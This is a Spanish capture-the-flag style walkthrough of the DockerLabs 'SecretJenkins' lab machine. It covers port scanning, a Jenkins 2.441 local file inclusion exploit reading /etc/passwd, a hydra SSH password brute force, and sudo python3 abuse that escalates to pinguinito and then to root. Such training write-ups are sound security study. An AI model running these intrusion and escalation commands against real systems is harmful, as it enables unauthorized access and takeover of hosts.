Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "SecretJenkins".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh secretjenkins.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene dos puertos abiertos, el 22 (SSH) y el 8080
```
Discovered open port 8080/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
```
Si ponemos en el navegador "172.17.0.2:8080" nos sale una panel de login en Jenkins.
Lo primero que vamos a mirar, es la version de Jenkins que esta corriendo por si es posible que haya alguna vulnerabilidad, y como en la propia pagina no vemos nada, vamos a mirar mediante "whatweb" a ver si conseguimos informacion adicional:
```
whatweb 172.17.0.2:8080
```
Y obtenemos informacion que nos dice que es la version 2.441 de Jenkins.
Ahora es momento de usar a nuestro amigo Google o de buscar en "searchsploit" por si hubiese alguna vulnerabilidad:
```
searchsploit jenkins 2.441
```
Y obtenemos:
```
------------------------------------------------ --------------------------------
 Exploit Title                                  |  Path
------------------------------------------------ --------------------------------
Jenkins 2.441 - Local File Inclusion            | java/webapps/51993.py
------------------------------------------------ --------------------------------
Shellcodes: No Results
```
Lo primero que hacemos es un "locate 51993.py" recibiendo como resultado:
```
/usr/share/exploitdb/exploits/java/webapps/51993.py
```
Ahora nos traemos el archivo a nuestro directorio de trabajo y, en mi caso, le cambio el nombre:
```
cp /usr/share/exploitdb/exploits/java/webapps/51993.py .

mv 51993.py jenkis_LFI.py
```
Ahora lo ejecutamos pero vemos que no nos sale nada, aunque nos dice que hay que ponerle la "url" para que funcione bien, asi que lo ejecutamos de forma correcta esta vez:
```
python3 jenkis_LFI.py 
usage: jenkis_LFI.py [-h] -u URL [-p PATH]
jenkis_LFI.py: error: the following arguments are required: -u/--url

❯ python3 jenkis_LFI.py -u http://172.17.0.2:8080/
```
Y en esta ocasion todo es correcto, preguntandonos que fichero es el que queremos descargar.
En este caso, lo que hemos escrito ha sido "/etc/passwd", para poder encontrar los usuarios de esta maquina:
```
Press Ctrl+C to exit
File to download:
> /etc/passwd

systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bobby:x:1001:1001::/home/bobby:/bin/bash    <=== Usuario
games:x:5:60:games:/usr/games:/usr/sbin/nologin
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash   <=== Usuario
```
Bien, parece que tenemos dos usuarios: "bobby" y "pinguinito".
Es el momento de probar ambos con HYDRA para ver si nos encuentra las contraseñas de alguno de ellos:
```
hydra -l bobby -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: bobby   password: chocolate
1 of 1 target successfully completed, 1 valid password found

```
Vemos que con "bobby" nos encuentra una contraseña que es "chocolate" por lo que vamos a entrar por SSH a ver si todo va bien:
```
ssh bobby@172.17.0.2
```
Tras aceptar las "fingerprints" escribiendo "yes" y poniendo la contraseña que hemos obtenido con HYDRA, estamos dentro:
```
bobby@8882fd45974e:~$ whoami
bobby

bobby@8882fd45974e:~$ 
```
Vale, ahora toca intentar una escalada de privilegios, por lo que escribiremos "sudo -l" obteniendo el siguiente mensaje:
```
bobby@8882fd45974e:~$ sudo -l
Matching Defaults entries for bobby on 8882fd45974e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User bobby may run the following commands on 8882fd45974e:
    (pinguinito) NOPASSWD: /usr/bin/python3
    
bobby@8882fd45974e:~$ 
```
Vemos que podemos ejecutar un archivo de Python como usuario pinguinito, asi que vamos a ejecutar una bash. En mi caso, queria crear un archivo "jenkins.py" pero no he podido porque no tenemos acceso a "nano", asi que lo que he hecho ha sido escribir:
```
sudo -u pinguinito /usr/bin/python3
```
Y ahora si, escribimos:
```
import os
os.system("bash")
```
Y si ahora ponemos "whoami" otra vez, vemos que somos el usuario "pinguinito":
```
pinguinito@8882fd45974e:/home/bobby$ whoami
pinguinito

pinguinito@8882fd45974e:/home/bobby$
```
De nuevo, vamos a poner un "sudo -l" para ver si podemos escalar privilegios asi:
```
pinguinito@8882fd45974e:/home/bobby$ sudo -l
Matching Defaults entries for pinguinito on 8882fd45974e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pinguinito may run the following commands on 8882fd45974e:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
    
pinguinito@8882fd45974e:/home/bobby$
```
Esta vez, vemos que podemos ejecutar el archivo "/opt/script.py" sin contraseña, aun asi, empezaremos por dar permisos escritura al archivo "script.py".
Podriamos poner bien:
```
chmod 744 /opt/script.py
	-rwxr--r-- 1 pinguinito root     272 May 11 08:22 script.py
	
O BIEN:

chmod 777 /opt/script.py
	-rwxrwxrwx 1 pinguinito root     272 May 11 08:22 script.py
```
Independientemente cual elijamos y ya con los permisos necesarios, escribimos:
```
echo 'import os; os.system("bash")' > /op/script.py
```
Lo que sustituira el contenido del archivo por esto que acabamos de introducir.
Por ultimo, ejecutamos el archivo con el comando:
```
pinguinito@8882fd45974e:/$ sudo /usr/bin/python3 /opt/script.py

root@8882fd45974e:/# whoami
root

root@8882fd45974e:/#
```
Y listo, tal y como vemos al poner "whoami", somos el usuario "root", por lo que la maquina estaria terminada.
